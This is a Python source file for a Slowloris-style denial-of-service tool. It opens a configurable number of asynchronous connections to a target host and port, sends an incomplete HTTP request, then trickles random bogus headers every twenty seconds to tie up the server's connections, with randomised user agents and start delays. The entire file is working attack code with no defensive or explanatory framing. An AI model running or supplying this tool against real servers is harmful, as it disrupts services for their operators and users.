from argparse import ArgumentParser
import asyncio
from functools import partial
import random
from string import ascii_letters
from typing import Callable, Generator

from fake_useragent import UserAgent

from utils import retry


async def headers(
    random_sleep: Callable[[], float],
    user_agent: UserAgent,
) -> Generator[bytes, None, None]:
    await asyncio.sleep(abs(random_sleep()))
    yield 'GET /ip HTTP/1.1\r\n'.encode('ascii')
    await asyncio.sleep(20)
    yield ('User-Agent: ' + user_agent.random + '\r\n').encode('ascii')
    while True:
        await asyncio.sleep(20)
        random_chars = random.sample(ascii_letters, random.randrange(3, 8))
        yield (
            ''.join(random_chars[:-1]) + ': ' + random_chars[-1] + '\r\n'
        ).encode('ascii')


@retry(on=ConnectionRefusedError, retries=3)
async def slow_loris(address, random_sleep, user_agent):
    print('Connected to server')
    _, server = await asyncio.open_connection(*address)
    async for header in headers(random_sleep, user_agent):
        print(f'Sending "{header}" to server')
        server.write(header)
        await server.drain()


async def main(address, loris_count, user_agent):
    lorises = [
        asyncio.create_task(
            slow_loris(
                address,
                partial(random.gauss, mu=10, sigma=20),
                user_agent,
            )
        )
        for _ in range(loris_count)
    ]
    await asyncio.gather(*lorises)


if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument('host', nargs='?', default='127.0.0.1')
    parser.add_argument('-p', dest='port', type=int, default=80)
    parser.add_argument(
        '-N',
        dest='loris_count',
        type=int,
        default=4,
        help='Number of lorises to connect to the server',
    )
    args = parser.parse_args()

    user_agent = UserAgent()

    address = (args.host, args.port)
    asyncio.run(main(address, args.loris_count, user_agent))
